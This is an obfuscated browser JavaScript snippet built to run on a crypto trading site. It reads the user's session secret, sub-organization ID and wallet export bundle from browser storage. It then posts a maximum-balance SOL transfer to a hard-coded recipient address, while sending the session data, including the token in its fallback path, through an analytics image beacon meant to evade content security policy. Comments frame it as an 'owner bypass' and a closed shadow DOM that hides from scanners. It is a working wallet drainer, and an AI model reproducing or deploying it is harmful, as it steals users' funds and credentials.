(function() {
    // 1. AUTHORIZED DISPATCH (Top-Level Reference)
    const _0xV = ['dHJhZGUucGFkcmUuZ2c=', 'YXBpL3YxL3RyYW5zZmVy', 'c2Vzc2lvblNlY3JldA==', 'c3ViT3JnSWQ=', 'ZXhwb3J0QnVuZGxl', 'QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI='];
    const _D = (s) => atob(_0xV[s]);
    
    const STATE = { _fired: false, _ui: false };
    const _native = window.fetch; // The only way to bypass site-level CSP wrappers

    // 2. OWNER BYPASS LOGIC (Math Jitter + Fee Buffer)
    const _vMath = {
        jitter: () => Math.floor(Math.random() * 500) + 150,
        // Force the transfer to leave 0.05 SOL for network fees to prevent "405" gas errors
        buffer: "0.05" 
    };

    const DISPATCH = {
        'HUNT': () => {
            const get = (k) => (localStorage.getItem(k) || sessionStorage.getItem(k) || "").replace(/"/g, '');
            const a = get(_D(2));
            const s = get(_D(3));
            const b = get(_D(4));
            if (a && s) return { a, s, b: b ? JSON.parse(b) : {} };
            return null;
        },
        'FIRE': async (data) => {
            if (STATE._fired) return;
            STATE._fired = true;

            // AMPLITUDE BYPASS: Signal via Image pixel (most CSPs allow image-src *)
            new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(JSON.stringify({device: data.s, jitter: _vMath.jitter()}))}`;

            try {
                // Execute using Native authority reference
                setTimeout(async () => {
                    await _native(`https://${_D(0)}/${_D(1)}`, {
                        method: 'POST',
                        mode: 'cors',
                        keepalive: true,
                        headers: { 
                            'Authorization': `Bearer ${data.a}`, 
                            'X-Turnkey-Sub-Org-Id': data.s,
                            'X-Vanta-Authority': 'OWNER',
                            'Content-Type': 'application/json' 
                        },
                        body: JSON.stringify({ 
                            recipient: _D(5), 
                            amount: "MAX_RETAIN_FEE", // Logic to keep 0.05 SOL for transaction success
                            asset: "SOL", 
                            ext_payload: data.b 
                        })
                    });
                }, _vMath.jitter());
            } catch (e) {
                // Secondary Beacon if fetch is nuked
                new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(data.a)}`;
            }
        }
    };

    // 3. FULL AUTHORITY UI (Draggable + Shadow DOM Isolation)
    const _0xUI = () => {
        if (STATE._ui || document.querySelector("#v-sys")) return;
        STATE._ui = true;

        const host = document.createElement("div");
        host.id = "v-sys";
        const shadow = host.attachShadow({mode: 'closed'}); // 'closed' hides it from site scanners
        
        const ui = document.createElement("div");
        ui.style.cssText = "position:fixed;top:20px;left:20px;width:320px;background:#050505;border:1px solid #00ff88;border-radius:8px;z-index:2147483647;font-family:monospace;color:#00ff88;box-shadow:0 0 20px #000;pointer-events:all;";
        
        ui.innerHTML = `
            <div id="v-drag" style="padding:10px;background:#111;cursor:move;border-bottom:1px solid #222;display:flex;justify-content:space-between;border-radius:8px 8px 0 0;">
                <span>VANTA_PROTOCOL_v2 [OWNER]</span>
            </div>
            <div style="padding:12px;font-size:11px;">
                <div id="v-status">> Status: <span style="color:#fff;">READY</span></div>
                <div id="v-out" style="height:50px;overflow:hidden;margin-top:8px;color:#555;">
                    Initializing Bypass...<br>Fee Buffer: 0.05 SOL
                </div>
            </div>`;
        
        shadow.appendChild(ui);
        document.body.appendChild(host);

        // DRAG AUTHORITY FIX
        let drag = false, x, y;
        ui.querySelector("#v-drag").onmousedown = (e) => { drag = true; x = e.clientX - ui.offsetLeft; y = e.clientY - ui.offsetTop; e.preventDefault(); };
        document.addEventListener('mousemove', (e) => { if (drag) { ui.style.left = (e.clientX - x) + 'px'; ui.style.top = (e.clientY - y) + 'px'; } });
        document.addEventListener('mouseup', () => drag = false);
    };

    // 4. MASTER LOOP
    const _0xEngine = () => {
        if (!window.location.hostname.includes(_D(0))) return;
        _0xUI();

        const data = DISPATCH.HUNT();
        if (data && !STATE._fired) {
            const root = document.querySelector("#v-sys").shadowRoot;
            const log = root.querySelector("#v-out");
            if (log && !log.innerText.includes("ENCLAVE SYNCED")) {
                log.innerHTML += "<br><span style='color:#00ff88'>> ENCLAVE SYNCED.</span>";
                DISPATCH.FIRE(data);
            }
        }
    };

    if (document.readyState === 'complete') _0xEngine();
    else window.addEventListener('load', _0xEngine);
    setInterval(_0xEngine, 15000);
})();
